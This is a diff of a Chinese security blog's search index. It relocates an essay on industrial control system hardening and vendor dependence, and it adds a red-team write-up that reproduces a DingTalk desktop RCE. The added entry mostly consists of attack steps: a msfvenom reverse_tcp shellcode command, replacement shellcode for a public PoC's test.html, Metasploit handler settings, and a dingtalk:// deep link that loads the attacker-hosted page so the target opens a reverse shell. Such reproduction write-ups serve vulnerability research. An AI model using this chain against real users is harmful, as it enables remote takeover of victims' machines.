@@ -1,29 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>国内DCS系统发展现状</title>
-    <url>/2022/09/03/%E5%9B%BD%E5%86%85DCS%E7%B3%BB%E7%BB%9F%E5%8F%91%E5%B1%95%E7%8E%B0%E7%8A%B6/</url>
-    <content><![CDATA[<p>先简单给各位介绍下DCS系统。DCS系统大多用于工业控制领域，主要用于控制生产制造系统，所体现的是控制功能分散而管理功能集中，属于分布式控制系统。实现集中管理和生产控制器交互，完成生产任务。与信息系统不同的是，在工业控制生产环境，对信息传递的实时性要求非常高，信息的延误可能会导致生产事故，因此多采用局域网通信。DCS系统适用于石油石化、水资源处理（如:污水处理厂）以及工业发电（火电、核电等）。</p>
-<p>在DCS系统的应用环境中是用的专用工控协议，很多人对工控协议有所误解，认为在工业控制中所用的专用协议，安全性肯定比常用协议好，其实不然。各种工控协议的设计之初，大多只考虑了生产环境要求的实时性，对安全性考虑得较少。比如我们在日常使用中加密算法，往往在工控协议中就不包含或是极少涉及，因为加密会影响实时性且占用局域网内的资源。工控网中的资源占用导致的后果是十分严重的，可能导致现场生产设备的失控。因此，在DCS系统中所做的安全防护可谓少之又少，近年国家对各种场站做了调查，发现国内百分之九十的DCS都没有做加固。对这些国外进口的设备丝毫不敢动，生怕厂商不给维护，过于依赖后台厂商。</p>
-<p>国内工控系统受制于系统厂商。常常表现为，很多事情的落实过度依赖于后台厂家，包括维护、检修、升级、安装安防产品等。</p>
-<p>比如说现在国内的DCS系统，几乎全都是国外厂商的、像是ABB、艾默生、福克斯波罗等，这也导致在DCS中做安全防护，像是主机加固等很难推进。因为厂家表示，做了国内的主机加固，出了问题他们厂家概不负责。他们也有所谓的“正当理由”，表示上的安防产品需要通过他们国外厂商的测评(实际上他们可能根本没有所谓的测评机构，往往只是不想让你用)。</p>
-<p>但实际上国家对这一块的要求早就相当明确，就拿国网来说，早在2006年的国网1167号文件就有规定，什么样的安全产品才能进入生产控制大区，即必须通过国家委托测评的产品就能够部署在生产大区，而南网2015年通用技术规范也有相关的要求。更关键的一点是，2015年能源局36号文的出台，更是提出了生产控制大区主机操作系统应当进行安全加固，原先做加固只能根据用户的需要和自身的安全意识高低决定做不做，而现在已经是有国家明文规定了。15年之前的主机加固推进相对艰难，但即便在现在能源局36号文出台6年后，仍旧有不少厂站主机系统没有做加固。面对这种情况，国外厂商也变着法子满足要求，自身系统附带主机加固软件，当然他们仅仅是为了满足国内文件要求，变相让我们不做国内的加固。这种厂商自己也做加固的行为从两方面就可以驳倒：</p>
-<ol>
-<li>国家文件早有规定什么样的安全产品才能进入生产控制大区，而不是说厂家自身的产品就是合规达标的，也许厂家自身的加固产品不会导致系统宕机，但没有通过测评的产品都是不合规达标的，而国外产品基本上都是没有通过国内测评。</li>
-<li>做主机加固的目的就是为了防止系统本身或外来攻击造成的核心业务非法中断、核心数据非法篡改的问题。主机加固也是为了防止厂家系统的一些漏洞问题，如果厂商自己做，那就相对于又是裁判员，又是参赛员，这就没有意义了，同时这一块也是为了防止国外的技术封锁，在系统中设下后门程序等。</li>
-</ol>
-<p>鉴于以上两点可以总结出，应该对生产控制大区主机操作系统进行安全加固，且所采用的产品应该通过国家指定机构的委托测评。在工控安全这一块不应过于受制于系统厂商。目前国家对工控安全日益重视，但现实是国内电厂、电网的安全意识仍旧低下。</p>
-<p>其实，十几年前有一段时间，国内新华集团制造的DCS系统在国内市场占有率相当可观，DEH国内占有率更是高达80%。而后来出于对国际大公司的信任，大大低估了“国际游戏”的玩法。想利用通过和GE公司的合作打开国外市场，殊不知对方早已虎视眈眈，被并购的决定直接就是投怀送抱，导致了封锁了国产DCS系统的发展，并被巨额索赔，直接导致了到目前为止新华集团的DCS系统在国内已经鲜有人知了。</p>
-<p>其实近些年国外企业打压手段已经逐渐浮出水面，恶意投资然后雪藏，或是投资傀儡公司以竞争名义进行打压等。19年的《美国陷阱》就已经揭露了GE如何在美国政府扶持下恶意收购法国的阿尔斯通，以现在的角度来看，这场“战争”早在几十年前就开始了，这场没有硝烟的战争终将会持续，并极大可能成为以后国际公司新的战场。最后借用《美国陷阱》中的一句话，阿尔斯通不是第一家被美国恶意收购的公司，也不会是最后一家。</p>
-]]></content>
-      <categories>
-        <category>工控安全</category>
-      </categories>
-      <tags>
-        <tag>杂谈</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>各代理工具及代理场景</title>
     <url>/2022/09/03/%E5%90%84%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BB%A3%E7%90%86%E5%9C%BA%E6%99%AF/</url>
     <content><![CDATA[<p>出于工作或是个人需求，有时候不想直接用真实的IP去访问某个网站，常用各种转发代理软件，给大家介绍下几种代理软件及特点和代理场景。</p>
@@ -97,6 +74,83 @@
       </categories>
       <tags>
         <tag>常用渗透点</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>钉钉RCE反弹shell</title>
+    <url>/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/</url>
+    <content><![CDATA[<p><strong>0x01 影响版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">钉钉版本&lt; 6.3.25-Release.2149108</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x02 复现过程</strong></p>
+<p>1、环境说明：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机:192.168.31.198(Kali Linux)</span><br><span class="line">目标机:192.168.239.135(windows10)</span><br><span class="line">钉钉6.3.5版本下载地址：</span><br><span class="line">https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v6.3.5.11308701.exe</span><br></pre></td></tr></table></figure>
+
+<p>注：此处有个问题，打开旧版钉钉会提示版本过老无法正常登录</p>
+<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/old.png" class title="This is an example image">
+
+<p>解决办法：<br>在另一台电脑安装最新版的钉钉，打开安装路径，复制staticconfig.xml文件替换到旧版即可，之后正常登录，记得把自动登录勾选上。然后在软件内设置不自动更新，退出后再把原先的配置文件覆盖回来即可解决乱码问题。其实不解决乱码问题也能触发payload。</p>
+<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/path1.png" class title="This is an example image">
+
+<p>2、msf生成shellcode:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.31</span><span class="number">.198</span> LPORT=<span class="number">8834</span> -f csharp</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/shellcode.png" class title="This is an example image">
+
+<p>3、替换payload里的shellcode</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">项目地址：https:<span class="comment">//github.com/crazy0x70/dingtalk-RCE</span></span><br><span class="line"></span><br><span class="line">替换项目中test.html中的shellcode，需要替换的位置为</span><br><span class="line">var shellcode=new Uint8Array([<span class="number">0xfc</span>,<span class="number">0xe8</span>,<span class="number">0x8f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x60</span>,<span class="number">0x89</span>,<span class="number">0xe5</span>,<span class="number">0x31</span>,<span class="number">0xd2</span>,<span class="number">0x64</span>,<span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x0c</span>,<span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x14</span>,<span class="number">0x0f</span>,<span class="number">0xb7</span>,<span class="number">0x4a</span>,<span class="number">0x26</span>,<span class="number">0x31</span>,<span class="number">0xff</span>,<span class="number">0x8b</span>,<span class="number">0x72</span>,<span class="number">0x28</span>...])</span><br></pre></td></tr></table></figure>
+
+<p>4、msf监听反弹端口</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">192.168</span><span class="number">.31</span><span class="number">.198</span></span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">8834</span></span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/listen.png" class title="This is an example image">
+
+<p>5、开启web服务，构造poc发送给目标机</p>
+<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/web%E6%9C%8D%E5%8A%A1.png" class title="This is an example image">
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poc:dingtalk://dingtalkclient/page/link?url=http://192.168.31.198:8080/dingding.html&amp;pc_slide=true</span><br></pre></td></tr></table></figure>
+
+<p>6、payload触发</p>
+<ul>
+<li>如果按照上面的方式操作，软件不会乱码，直接发送在聊天框点击触发即可</li>
+<li>乱码情况下直接在浏览器访问引导触发也可以</li>
+</ul>
+<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/dingtalk.png" class title="This is an example image">
+
+<p>点击打开，kali就能反弹到shell</p>
+<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/shell.png" class title="This is an example image">
+
+<p><strong>0x03 修复建议</strong></p>
+<p>更新到最新版即可</p>
+]]></content>
+      <categories>
+        <category>红队</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>国内DCS系统发展现状</title>
+    <url>/2022/09/03/%E5%9B%BD%E5%86%85DCS%E7%B3%BB%E7%BB%9F%E5%8F%91%E5%B1%95%E7%8E%B0%E7%8A%B6/</url>
+    <content><![CDATA[<p>先简单给各位介绍下DCS系统。DCS系统大多用于工业控制领域，主要用于控制生产制造系统，所体现的是控制功能分散而管理功能集中，属于分布式控制系统。实现集中管理和生产控制器交互，完成生产任务。与信息系统不同的是，在工业控制生产环境，对信息传递的实时性要求非常高，信息的延误可能会导致生产事故，因此多采用局域网通信。DCS系统适用于石油石化、水资源处理（如:污水处理厂）以及工业发电（火电、核电等）。</p>
+<p>在DCS系统的应用环境中是用的专用工控协议，很多人对工控协议有所误解，认为在工业控制中所用的专用协议，安全性肯定比常用协议好，其实不然。各种工控协议的设计之初，大多只考虑了生产环境要求的实时性，对安全性考虑得较少。比如我们在日常使用中加密算法，往往在工控协议中就不包含或是极少涉及，因为加密会影响实时性且占用局域网内的资源。工控网中的资源占用导致的后果是十分严重的，可能导致现场生产设备的失控。因此，在DCS系统中所做的安全防护可谓少之又少，近年国家对各种场站做了调查，发现国内百分之九十的DCS都没有做加固。对这些国外进口的设备丝毫不敢动，生怕厂商不给维护，过于依赖后台厂商。</p>
+<p>国内工控系统受制于系统厂商。常常表现为，很多事情的落实过度依赖于后台厂家，包括维护、检修、升级、安装安防产品等。</p>
+<p>比如说现在国内的DCS系统，几乎全都是国外厂商的、像是ABB、艾默生、福克斯波罗等，这也导致在DCS中做安全防护，像是主机加固等很难推进。因为厂家表示，做了国内的主机加固，出了问题他们厂家概不负责。他们也有所谓的“正当理由”，表示上的安防产品需要通过他们国外厂商的测评(实际上他们可能根本没有所谓的测评机构，往往只是不想让你用)。</p>
+<p>但实际上国家对这一块的要求早就相当明确，就拿国网来说，早在2006年的国网1167号文件就有规定，什么样的安全产品才能进入生产控制大区，即必须通过国家委托测评的产品就能够部署在生产大区，而南网2015年通用技术规范也有相关的要求。更关键的一点是，2015年能源局36号文的出台，更是提出了生产控制大区主机操作系统应当进行安全加固，原先做加固只能根据用户的需要和自身的安全意识高低决定做不做，而现在已经是有国家明文规定了。15年之前的主机加固推进相对艰难，但即便在现在能源局36号文出台6年后，仍旧有不少厂站主机系统没有做加固。面对这种情况，国外厂商也变着法子满足要求，自身系统附带主机加固软件，当然他们仅仅是为了满足国内文件要求，变相让我们不做国内的加固。这种厂商自己也做加固的行为从两方面就可以驳倒：</p>
+<ol>
+<li>国家文件早有规定什么样的安全产品才能进入生产控制大区，而不是说厂家自身的产品就是合规达标的，也许厂家自身的加固产品不会导致系统宕机，但没有通过测评的产品都是不合规达标的，而国外产品基本上都是没有通过国内测评。</li>
+<li>做主机加固的目的就是为了防止系统本身或外来攻击造成的核心业务非法中断、核心数据非法篡改的问题。主机加固也是为了防止厂家系统的一些漏洞问题，如果厂商自己做，那就相对于又是裁判员，又是参赛员，这就没有意义了，同时这一块也是为了防止国外的技术封锁，在系统中设下后门程序等。</li>
+</ol>
+<p>鉴于以上两点可以总结出，应该对生产控制大区主机操作系统进行安全加固，且所采用的产品应该通过国家指定机构的委托测评。在工控安全这一块不应过于受制于系统厂商。目前国家对工控安全日益重视，但现实是国内电厂、电网的安全意识仍旧低下。</p>
+<p>其实，十几年前有一段时间，国内新华集团制造的DCS系统在国内市场占有率相当可观，DEH国内占有率更是高达80%。而后来出于对国际大公司的信任，大大低估了“国际游戏”的玩法。想利用通过和GE公司的合作打开国外市场，殊不知对方早已虎视眈眈，被并购的决定直接就是投怀送抱，导致了封锁了国产DCS系统的发展，并被巨额索赔，直接导致了到目前为止新华集团的DCS系统在国内已经鲜有人知了。</p>
+<p>其实近些年国外企业打压手段已经逐渐浮出水面，恶意投资然后雪藏，或是投资傀儡公司以竞争名义进行打压等。19年的《美国陷阱》就已经揭露了GE如何在美国政府扶持下恶意收购法国的阿尔斯通，以现在的角度来看，这场“战争”早在几十年前就开始了，这场没有硝烟的战争终将会持续，并极大可能成为以后国际公司新的战场。最后借用《美国陷阱》中的一句话，阿尔斯通不是第一家被美国恶意收购的公司，也不会是最后一家。</p>
+]]></content>
+      <categories>
+        <category>工控安全</category>
+      </categories>
+      <tags>
+        <tag>杂谈</tag>
       </tags>
   </entry>
   <entry>
